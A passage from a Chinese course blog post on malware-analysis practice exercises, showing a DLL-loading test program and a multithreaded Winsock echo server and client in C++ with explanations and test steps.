        ReadAndPrintFilePtr readAndPrintFile = (ReadAndPrintFilePtr)GetProcAddress(dllHandle, &quot;ReadAndPrintFile&quot;);
        WriteToFilePtr writeToFile = (WriteToFilePtr)GetProcAddress(dllHandle, &quot;WriteToFile&quot;);

        if (function1 != NULL &amp;&amp; readAndPrintFile != NULL &amp;&amp; writeToFile != NULL) &#123;
            // 调用 DLL 中的函数
            function1();
            if(argc == 2)&#123;
                readAndPrintFile(argv[1]);  // 使用命令行参数指定的文件名
            &#125;
            if (argc &gt;= 3) &#123;
                writeToFile(argv[1], argv[2], std::ios::app);  // 如果有第三个参数，使用命令行参数指定的内容
            &#125;
        &#125; else &#123;
            std::cerr &lt;&lt; &quot;Failed to get function addresses.\n&quot;;
        &#125;

        // 卸载 DLL
        FreeLibrary(dllHandle);
    &#125; else &#123;
        std::cerr &lt;&lt; &quot;Failed to load DLL.\n&quot;;
    &#125;

    return 0;
&#125;
</code></pre>
<p>编译a.cpp</p>
<pre><code class="shell">gcc a.cpp
</code></pre>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>运行a.exe测试。</p>
<ol>
<li>查看test.txt文件中的内容</li>
</ol>
<pre><code class="shell">a.exe test.txt
</code></pre>
<p>当task2.dll文件被导入，<code>DLLMain</code>函数会被执行，现在是被a.exe进程导入，所以运行了<code>switch case</code>语句中<code>DLL_PROCESS_ATTACH</code>分支下的代码。</p>
<p><img src="/../img/Malware-Analysis-practice2/2.png" alt="2"></p>
<p>然后调用了function_1函数，消息框被弹出。</p>
<p><img src="/../img/Malware-Analysis-practice2/3.png" alt="3"></p>
<p>紧接着运行<code>ReadAndPrintFile</code>函数，打印test.txt文件中的内容，然后a.exe在结束之前需要执行<code>FreeLibrary</code>卸载<code>DLL</code>文件，这时<code>switch case</code>语句中<code>DLL_PROCESS_DETACH</code>分支下的代码会被执行。</p>
<p><img src="/../img/Malware-Analysis-practice2/4.png" alt="4"></p>
<ol start="2">
<li>往test.txt文件中写入数据。</li>
</ol>
<pre><code class="shell">a.exe test.txt &quot;data&quot;
</code></pre>
<p><img src="/../img/Malware-Analysis-practice2/5.png" alt="5"></p>
<h2 id="简单多线程服务器"><a href="#简单多线程服务器" class="headerlink" title="简单多线程服务器"></a>简单多线程服务器</h2><h3 id="实验要求-2"><a href="#实验要求-2" class="headerlink" title="实验要求"></a>实验要求</h3><p>编写一个简单的echo服务器程序（即：客户端与服务器建立连接后，在客户端输入消息，服务器端就会打印输入的消息），在4444端口进行监听。每有一个客户端进行连接时候，服务器创建一个子线程，对客户端程序进行服务。需要引入互斥量对共享代码区或全局变量进行互斥访问，要求使用信号传递等待机制。根据要求，客户端代码也需要自行编写。</p>
<h3 id="实验环境-2"><a href="#实验环境-2" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li><p>Windows 7或Windows 10主机（虚拟机）至少两台；</p>
</li>
<li><p>代码编辑器；</p>
</li>
<li><p>C&#x2F;C++代码运行所需环境。</p>
</li>
</ul>
<h3 id="实验目的-2"><a href="#实验目的-2" class="headerlink" title="实验目的"></a>实验目的</h3><p>了解恶意代码在通信时，会使用到的最基本的技术。练习多线程编程。</p>
<h3 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h3><h5 id="服务端的代码task3-server-cpp"><a href="#服务端的代码task3-server-cpp" class="headerlink" title="服务端的代码task3_server.cpp"></a>服务端的代码<code>task3_server.cpp</code></h5><pre><code class="c++">#include &lt;iostream&gt;
#include &lt;winsock2.h&gt;
#include &lt;ws2tcpip.h&gt;
#include &lt;thread&gt;
#include &lt;mutex&gt;
#include &lt;vector&gt;

#pragma comment(lib, &quot;ws2_32.lib&quot;)

std::mutex mtx;

// 存储客户端信息的结构体
struct ClientInfo &#123;
    std::string ip;
    int port;
&#125;;

// 存储连接的客户端信息的容器
std::vector&lt;ClientInfo&gt; connectedClients;

void HandleClient(SOCKET clientSocket) &#123;
    char buffer[1024];
    int bytesReceived;

    // 获取客户端地址信息
    sockaddr_in clientAddr;
    int addrLen = sizeof(clientAddr);
    getpeername(clientSocket, (sockaddr*)&amp;clientAddr, &amp;addrLen);

    // 存储客户端信息到容器
    // 保护容器
    &#123;
    std::lock_guard&lt;std::mutex&gt; lock(mtx);
    // 正在对互斥锁 mtx 进行加锁，当 lock 对象超出范围时（例如，在块或函数的末尾），它会自动释放对互斥锁的锁定。
    // 在这里,每一次循环结束之后就会释放锁。
    // 该mtx是对vector进行保护。
    // 所以这里必须要在大括号中,让mtx出大括号之后就被释放,不然会死锁....
    connectedClients.push_back(&#123;inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port)&#125;);
    
    // 打印当前连接情况
    std::cout &lt;&lt; &quot;Client connected. Total clients: &quot; &lt;&lt; connectedClients.size() &lt;&lt; &quot;\n&quot;;
        for (const auto&amp; client : connectedClients) &#123;
            std::cout &lt;&lt; &quot;   &quot; &lt;&lt; client.ip &lt;&lt; &quot;:&quot; &lt;&lt; client.port &lt;&lt; &quot;\n&quot;;
        &#125;
    std::cout &lt;&lt; &quot;-----------------------------\n&quot;;
    &#125;

    do &#123;
        // 接收客户端消息
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived &gt; 0) &#123;
            // 对共享资源使用互斥量进行保护
            // 保护cout
            std::lock_guard&lt;std::mutex&gt; lock(mtx);
            // 打印客户端信息及消息到本地
            buffer[bytesReceived] = &#39;\0&#39;;
            std::cout &lt;&lt; &quot;Received from &quot; &lt;&lt; inet_ntoa(clientAddr.sin_addr) &lt;&lt; &quot;:&quot; &lt;&lt; ntohs(clientAddr.sin_port)
                      &lt;&lt; &quot; - &quot; &lt;&lt; buffer &lt;&lt; std::endl;

            // 原样发送消息回客户端
            send(clientSocket, buffer, bytesReceived, 0);
        &#125; else if (bytesReceived == 0) &#123;
            // 客户端断开连接
            // 保护cout和容器
            std::lock_guard&lt;std::mutex&gt; lock(mtx);
            std::cout &lt;&lt; &quot;Client &quot; &lt;&lt; inet_ntoa(clientAddr.sin_addr) &lt;&lt; &quot;:&quot; &lt;&lt; ntohs(clientAddr.sin_port)
                      &lt;&lt; &quot; disconnected.\n&quot;;
            
            // 从容器中移除断开连接的客户端信息
            for (auto it = connectedClients.begin(); it != connectedClients.end(); ++it) &#123;
                if (it-&gt;ip == inet_ntoa(clientAddr.sin_addr) &amp;&amp; it-&gt;port == ntohs(clientAddr.sin_port)) &#123;
                    connectedClients.erase(it);
                    break;
                &#125;
            &#125;
        &#125;
    &#125; while (bytesReceived &gt; 0);

    // 关闭套接字
    closesocket(clientSocket);
&#125;

int main() &#123;
    // 初始化Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0) &#123;
        std::cerr &lt;&lt; &quot;Failed to initialize Winsock.\n&quot;;
        return 1;
    &#125;

   // 创建一个套接字（socket），用于建立网络连接
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) &#123;
        // 如果创建套接字失败，输出错误信息，清理Winsock并返回错误码1
        std::cerr &lt;&lt; &quot;Failed to create socket.\n&quot;;
        WSACleanup();
        return 1;
    &#125;

    // 设置服务器地址信息
    sockaddr_in serverAddr;						   // 定义一个 sockaddr_in 结构体用于存储服务器地址信息
    serverAddr.sin_family = AF_INET;               // 使用IPv4地址
    serverAddr.sin_port = htons(4444);             // 设置服务器监听的端口号为4444
    serverAddr.sin_addr.s_addr = INADDR_ANY;       // 服务器监听任何可用的网络接口

    // 绑定套接字到服务器地址
    if (bind(serverSocket, (sockaddr*)&amp;serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) &#123;
        // 如果绑定失败，输出错误信息，关闭套接字，清理Winsock，并返回错误码1
        std::cerr &lt;&lt; &quot;Failed to bind socket.\n&quot;;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    &#125;

    // 监听套接字，等待客户端连接请求
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) &#123;
        // 如果监听失败，输出错误信息，关闭套接字，清理Winsock，并返回错误码1
        std::cerr &lt;&lt; &quot;Failed to listen on socket.\n&quot;;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    &#125;

    std::cout &lt;&lt; &quot;Server is listening on port 4444...\n&quot;;

    while (true) &#123;
        // 接受客户端连接
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);
        if (clientSocket == INVALID_SOCKET) &#123;
            std::cerr &lt;&lt; &quot;Failed to accept client connection.\n&quot;;
            closesocket(serverSocket);
            WSACleanup();
            return 1;
        &#125;

        // 创建子线程为客户端提供服务
        std::thread(HandleClient, clientSocket).detach();
    &#125;
    
    // 关闭套接字和清理Winsock
    closesocket(serverSocket);
    WSACleanup();

    return 0;
&#125;
</code></pre>
<p>这段代码是一个简单的基于Winsock的服务器程序，它监听端口4444，接受客户端连接，然后为每个客户端创建一个新的线程来处理通信。以下是这段代码的主要功能和一些值得注意的地方：</p>
<ol>
<li><p><strong>初始化Winsock：</strong></p>
<pre><code class="c++">if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0) &#123;
    // ...
&#125;
</code></pre>
<p>这部分代码用于初始化Winsock库，确保网络库正确启动。</p>
</li>
<li><p><strong>创建套接字并绑定：</strong></p>
<pre><code class="c++">SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
// ...
bind(serverSocket, (sockaddr*)&amp;serverAddr, sizeof(serverAddr));
// ...
listen(serverSocket, SOMAXCONN);
</code></pre>
<p>在这里，创建了一个套接字，将其绑定到特定地址和端口，然后开始监听客户端的连接请求。</p>
</li>
<li><p><strong>主循环：</strong></p>
<pre><code class="c++">while (true) &#123;
    // 接受客户端连接
    SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);
    // ...
    std::thread(HandleClient, clientSocket).detach();
&#125;
</code></pre>
<p>服务器在一个无限循环中等待客户端连接。每当有新的客户端连接时，服务器会为该客户端创建一个新的线程（使用 <code>std::thread</code>）并调用 <code>HandleClient</code> 函数来处理与客户端的通信。</p>
</li>
<li><p><strong>HandleClient函数：</strong></p>
<pre><code class="c++">void HandleClient(SOCKET clientSocket) &#123;
    // ...
&#125;
</code></pre>
<p>这个函数负责处理与每个客户端的通信。它首先获取客户端的地址信息，然后将客户端信息存储到 <code>connectedClients</code> 容器中。接着，它进入一个循环，不断接收客户端的消息，处理消息，并在客户端断开连接时进行清理。注意到这些对 <code>connectedClients</code> 容器和输出到 <code>std::cout</code> 的操作都被互斥锁 <code>mtx</code> 保护，以防止多线程访问时的竞争条件。</p>
</li>
<li><p><strong>注意事项：</strong></p>
<ul>
<li>使用了互斥锁 <code>mtx</code> 来保护对 <code>connectedClients</code> 容器的并发访问，确保数据一致性。</li>
<li>为了避免死锁，对 <code>connectedClients</code> 容器的访问被包裹在大括号中，确保在离开大括号时锁被释放。</li>
<li>使用 <code>std::thread(HandleClient, clientSocket).detach();</code> 将客户端处理函数在新线程中运行，但这可能导致线程不能被适当地等待和管理，因此需要小心处理线程的生命周期。</li>
</ul>
</li>
</ol>
<h5 id="客户端的代码task3-client-cpp"><a href="#客户端的代码task3-client-cpp" class="headerlink" title="客户端的代码task3_client.cpp"></a>客户端的代码<code>task3_client.cpp</code></h5><pre><code class="c++">#include &lt;iostream&gt;
#include &lt;winsock2.h&gt;

// 链接到 ws2_32.lib 库
#pragma comment(lib, &quot;ws2_32.lib&quot;)

// 函数用于将数据发送给服务器
void sendDataToServer(SOCKET clientSocket, const std::string&amp; message) &#123;
    // 使用 send 函数发送数据到服务器
    int bytesSent = send(clientSocket, message.c_str(), message.size(), 0);
    // 检查发送是否成功
    if (bytesSent == SOCKET_ERROR) &#123;
        std::cerr &lt;&lt; &quot;Failed to send data to server.\n&quot;;
    &#125;
&#125;

// 函数用于从服务器接收数据
void receiveDataFromServer(SOCKET clientSocket) &#123;
    char buffer[1024];
    // 使用 recv 函数接收从服务器发来的数据
    int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
    // 处理接收到的数据
    if (bytesRead &gt; 0) &#123;
        buffer[bytesRead] = &#39;\0&#39;;
        std::cout &lt;&lt; &quot;Received from server: &quot; &lt;&lt; buffer &lt;&lt; &quot;\n&quot;;
    &#125; else if (bytesRead == 0) &#123;
        std::cout &lt;&lt; &quot;Server closed the connection.\n&quot;;
    &#125; else &#123;
        std::cerr &lt;&lt; &quot;Failed to receive data from server.\n&quot;;
    &#125;
&#125;

int main() &#123;
    // 初始化 Winsock 库
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0) &#123;
        std::cerr &lt;&lt; &quot;Failed to initialize Winsock.\n&quot;;
        return 1;
    &#125;

    // 创建套接字
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) &#123;
        std::cerr &lt;&lt; &quot;Failed to create socket.\n&quot;;
        WSACleanup();
        return 1;
    &#125;

    // 设置服务器地址和端口
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(4444);
    serverAddress.sin_addr.s_addr = inet_addr(&quot;192.168.65.136&quot;);  // 服务器的 IP 地址

    // 连接到服务器
    if (connect(clientSocket, (struct sockaddr*)&amp;serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) &#123;
        std::cerr &lt;&lt; &quot;Failed to connect to server.\n&quot;;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    &#125;

    std::cout &lt;&lt; &quot;Connected to server.\n&quot;;

    std::string message;

    do &#123;
        // 从命令行输入获取消息
        std::cout &lt;&lt; &quot;Enter message (type &#39;exit&#39; to close): &quot;;
        std::getline(std::cin, message);

        // 如果输入 &#39;exit&#39;，则退出循环
        if (message == &quot;exit&quot;) &#123;
            sendDataToServer(clientSocket,&quot;&quot;);  //发送的字节数为0，触发server端的disconnect
            break;
        &#125;
        
        // 发送消息给服务器
        sendDataToServer(clientSocket, message);
        
        // 接收服务器的响应
        receiveDataFromServer(clientSocket);

    &#125; while (true);

    // 关闭套接字
    closesocket(clientSocket);
    WSACleanup();

    return 0;
&#125;
</code></pre>
<p><strong>主要功能和值得注意的地方：</strong></p>
<p><strong>1. 初始化 Winsock 库：</strong></p>
<pre><code class="c++">WSADATA wsaData;
if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0) &#123;
    std::cerr &lt;&lt; &quot;Failed to initialize Winsock.\n&quot;;
    return 1;
&#125;
</code></pre>
<p>这部分代码用于初始化 Winsock 库，确保网络库正确启动。</p>
<p><strong>2. 创建套接字并连接到服务器：</strong></p>
<pre><code class="c++">SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
// ...
sockaddr_in serverAddress;
serverAddress.sin_family = AF_INET;
serverAddress.sin_port = htons(4444);
serverAddress.sin_addr.s_addr = inet_addr(&quot;192.168.65.136&quot;);
// ...
if (connect(clientSocket, (struct sockaddr*)&amp;serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) &#123;
    std::cerr &lt;&lt; &quot;Failed to connect to server.\n&quot;;
    closesocket(clientSocket);
    WSACleanup();
    return 1;
&#125;
</code></pre>
<p>在这里，客户端创建了一个套接字并连接到指定的服务器地址和端口。</p>
<p><strong>3. 发送和接收数据：</strong></p>
<pre><code class="c++">do &#123;
    // 从命令行输入获取消息
    // ...
    // 发送消息给服务器
    sendDataToServer(clientSocket, message);
    // ...
    // 接收服务器的响应
    receiveDataFromServer(clientSocket);
&#125; while (true);
</code></pre>
<p>客户端通过 <code>sendDataToServer</code> 函数将用户输入的消息发送给服务器，并通过 <code>receiveDataFromServer</code> 函数接收服务器的响应。</p>
<p><strong>4. 关闭套接字和清理 Winsock：</strong></p>
<pre><code class="c++">closesocket(clientSocket);
WSACleanup();
</code></pre>
<p>在程序结束时，客户端关闭套接字并清理 Winsock 资源。</p>
<p><strong>5. 注意事项：</strong></p>
<ul>
<li>与服务器端一样，客户端也使用了 Winsock 初始化和清理。</li>
<li>IP 地址硬编码为 “192.168.65.136”，在实际应用中可能需要根据实际情况进行更灵活的配置。</li>
<li>输入 ‘exit’ 会退出循环，关闭套接字，并清理 Winsock</li>
</ul>
<h5 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h5><ol>
<li><strong>输入以下指令编译cpp。</strong></li>
</ol>
<pre><code class="shell">g++ task3_server.cpp -o task3_server.exe -lws2_32
g++ task3_client.cpp -o task3_client.exe -lws2_32
</code></pre>
<p><code>-lws2_32</code> 选项的作用是在链接阶段将 Winsock 库与你的程序关联，使得你可以在程序中使用 Winsock 提供的网络函数。如果你在程序中使用了 Winsock 函数，但没有添加这个选项，编译器会报错，因为它找不到相应的函数实现。</p>
<ol start="2">
<li><strong>在虚拟机(ip&#x3D;192.168.65.136)上运行server程序，在物理机上运行client程序。</strong></li>
</ol>
<p>在虚拟机上运行task3_server.exe:</p>
<p><img src="/../img/Malware-Analysis-practice2/6.png" alt="6"></p>
<p>在物理机上运行task3_client.exe:</p>
<p><img src="/../img/Malware-Analysis-practice2/7.png" alt="7"></p>
<p>可以看见client端连接上server端时，server端会打印目前连接的client数量以及ip和port信息。</p>
<ol start="3">
<li><strong>尝试多个client端连接server端</strong></li>
</ol>
<p>在物理机上运行3个task3_client.exe程序，模拟三个client连接至server。</p>
<p><img src="/../img/Malware-Analysis-practice2/8.png" alt="8"></p>
<p>可以在server端看见三个client的ip和port信息。</p>
<ol start="4">
<li><strong>client端向server端发送数据</strong></li>
</ol>
<p><img src="/../img/Malware-Analysis-practice2/9.png" alt="9"></p>
<p>可以看见在server端可以正常收到多个client的消息，并且能够正确处理。</p>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-11-26</span>
            
                <span>该篇文章被 jay1an</span>
            
            
                <span>打上标签:
                    
                    
                        <a href='/tags/c/'>
                            c
                        </a>
                    
                        <a href='/tags/%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/'>
                            系统编程
                        </a>
                    
                        <a href='/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/'>
                            恶意代码分析
                        </a>
                    
                </span>
             
             
                <span>归为分类:
                    
                    
                        <a href='/categories/%E5%9B%9B%E5%B7%9D%E5%A4%A7%E5%AD%A6-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/'>
                            四川大学-恶意代码分析
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        

     
</div>



                    
                    
                    <div class="footer">
    
        <span> 
            © 1949-2023 China 

            
                

            
        </span>
    
</div>
<!--这是指一条线往下的内容-->
<div class="footer-last">
    
            <span>从头努力也坎坷</span>
            
    
</div>


    
        
<link rel="stylesheet" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/a11y-dark.min.css">

        
<script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/highlight.min.js"></script>

        
<script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/highlightjs-line-numbers.js"></script>

    


<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>
                </div>
            
    </body>
</html>